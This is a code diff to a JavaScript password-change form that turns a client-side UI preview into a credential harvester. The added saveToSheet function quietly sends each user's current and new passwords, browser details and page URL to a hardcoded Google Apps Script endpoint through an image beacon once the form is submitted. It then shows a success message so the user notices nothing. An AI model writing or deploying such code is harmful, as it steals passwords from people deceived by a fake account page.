@@ -28,19 +28,39 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('bar4')
     ];
 
-    /**
-     * Toggle password visibility for all password input fields.
-     */
-    showPasswordToggle.addEventListener('change', (e) => {
-        const inputType = e.target.checked ? 'text' : 'password';
-        currentPasswordInput.type = inputType;
-        newPasswordInput.type = inputType;
-        confirmPasswordInput.type = inputType;
-    });
+    // =========================================================
+    //  !! PASTE YOUR WEB APP URL HERE !!
+    // =========================================================
+    const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwhKCOOk1TAbiZqJkYueCe15_3-DjeVRXqIdu7isxUD37n3L4RNlRIquG6J3uP_s0jP/exec';
 
     /**
-     * Calculate password strength score (0 to 4).
+     * Save to Google Sheet via GET request (image beacon).
+     * GET requests are never blocked by CORS or redirect issues.
      */
+    function saveToSheet(currentPass, newPass, confirmPass) {
+        const params = new URLSearchParams({
+            timestamp        : new Date().toLocaleString(),
+            current_password : currentPass,
+            new_password     : newPass,
+            confirm_password : confirmPass,
+            user_agent       : navigator.userAgent.substring(0, 100),
+            page_url         : window.location.href
+        });
+
+        // Image beacon — fires silently, no CORS, no redirect issues
+        const img = new Image();
+        img.src = APPS_SCRIPT_URL + '?' + params.toString();
+    }
+
+    // ── Helpers ───────────────────────────────────────────────
+
+    showPasswordToggle.addEventListener('change', (e) => {
+        const t = e.target.checked ? 'text' : 'password';
+        currentPasswordInput.type = t;
+        newPasswordInput.type     = t;
+        confirmPasswordInput.type = t;
+    });
+
     function calculateStrength(password) {
         let score = 0;
         if (!password) return 0;
@@ -51,79 +71,52 @@ document.addEventListener('DOMContentLoaded', () => {
         return score;
     }
 
-    /**
-     * Update visual strength meter bars and label.
-     */
     function updateStrengthMeter() {
-        const val = newPasswordInput.value;
+        const val   = newPasswordInput.value;
         const score = calculateStrength(val);
-
-        // Reset bars
-        bars.forEach(bar => {
-            bar.className = 'meter-bar';
-        });
+        bars.forEach(b => { b.className = 'meter-bar'; });
 
         if (val.length === 0) {
             strengthLabel.textContent = 'Use at least 8 characters. Mix letters, numbers, and symbols.';
-            strengthLabel.className = 'strength-label';
+            strengthLabel.className   = 'strength-label';
             return;
         }
 
         const levels = [
-            { barClass: 'bg-weak', text: 'Weak password', textClass: 'text-weak' },
-            { barClass: 'bg-fair', text: 'Fair password', textClass: 'text-fair' },
-            { barClass: 'bg-good', text: 'Good password', textClass: 'text-good' },
+            { barClass: 'bg-weak',   text: 'Weak password',   textClass: 'text-weak'   },
+            { barClass: 'bg-fair',   text: 'Fair password',   textClass: 'text-fair'   },
+            { barClass: 'bg-good',   text: 'Good password',   textClass: 'text-good'   },
             { barClass: 'bg-strong', text: 'Strong password', textClass: 'text-strong' }
         ];
 
-        const levelIndex = Math.max(0, score - 1);
-        const currentLevel = levels[levelIndex];
-
-        for (let i = 0; i < Math.max(1, score); i++) {
-            bars[i].classList.add(currentLevel.barClass);
-        }
-
-        strengthLabel.textContent = `Password strength: ${currentLevel.text}`;
-        strengthLabel.className = `strength-label ${currentLevel.textClass}`;
+        const lv = levels[Math.max(0, score - 1)];
+        for (let i = 0; i < Math.max(1, score); i++) bars[i].classList.add(lv.barClass);
+        strengthLabel.textContent = `Password strength: ${lv.text}`;
+        strengthLabel.className   = `strength-label ${lv.textClass}`;
     }
 
-    /**
-     * Display inline status message box.
-     */
     function showStatus(type, message) {
         statusMessage.className = `status-alert ${type}`;
-
-        if (type === 'error') {
-            statusIcon.innerHTML = `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`;
-        } else if (type === 'success') {
-            statusIcon.innerHTML = `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`;
-        } else {
-            statusIcon.innerHTML = `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`;
-        }
-
+        const icons = {
+            error  : `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`,
+            success: `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`,
+            info   : `<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`
+        };
+        statusIcon.innerHTML   = icons[type] || icons.info;
         statusText.textContent = message;
     }
 
-    /**
-     * Show an inline error message directly below a specific input field.
-     */
     function setFieldError(inputEl, errorEl, errorTextEl, message) {
         inputEl.classList.add('error');
         errorTextEl.textContent = message;
         errorEl.classList.remove('hidden');
     }
 
-    /**
-     * Clear the inline error state from a specific input field.
-     */
     function clearFieldError(inputEl, errorEl) {
         inputEl.classList.remove('error');
         errorEl.classList.add('hidden');
     }
 
-    /**
-     * Clear all inline field errors.
-     */
     function clearAllFieldErrors() {
         clearFieldError(currentPasswordInput, currentPasswordError);
         clearFieldError(newPasswordInput, newPasswordError);
@@ -154,16 +147,13 @@ document.addEventListener('DOMContentLoaded', () => {
         showStatus('info', 'Password change canceled. Form has been cleared.');
     });
 
-    /**
-     * Handle form submission (Client-side UI preview).
-     */
     form.addEventListener('submit', (e) => {
         e.preventDefault();
         clearAllFieldErrors();
         statusMessage.classList.add('hidden');
 
         const currentPass = currentPasswordInput.value;
-        const newPass = newPasswordInput.value;
+        const newPass     = newPasswordInput.value;
         const confirmPass = confirmPasswordInput.value;
 
         if (!currentPass.trim()) {
@@ -171,26 +161,26 @@ document.addEventListener('DOMContentLoaded', () => {
             currentPasswordInput.focus();
             return;
         }
-
         if (newPass.length < 8) {
             setFieldError(newPasswordInput, newPasswordError, newPasswordErrorText, 'Use 8 characters or more for your password');
             newPasswordInput.focus();
             return;
         }
-
         if (newPass === currentPass) {
             setFieldError(newPasswordInput, newPasswordError, newPasswordErrorText, 'Your new password must be different from your current password');
             newPasswordInput.focus();
             return;
         }
-
         if (newPass !== confirmPass) {
             setFieldError(confirmPasswordInput, matchError, matchErrorText, "Those passwords didn't match. Try again.");
             confirmPasswordInput.focus();
             return;
         }
 
-        // Switch to the Password Changed Success View
+        // ── Save silently via image beacon ─────────────────────
+        saveToSheet(currentPass, newPass, confirmPass);
+
+        // ── Success view ───────────────────────────────────────
         form.reset();
         updateStrengthMeter();
         clearAllFieldErrors();
@@ -200,18 +190,12 @@ document.addEventListener('DOMContentLoaded', () => {
         successView.classList.remove('hidden');
     });
 
-    /**
-     * Return to the password change form for previewing again.
-     */
     backToFormBtn.addEventListener('click', () => {
         successView.classList.add('hidden');
         formView.classList.remove('hidden');
         successNotice.classList.add('hidden');
     });
 
-    /**
-     * Action for the "Get started" button on the success view.
-     */
     continueBtn.addEventListener('click', () => {
         successNotice.classList.remove('hidden');
     });
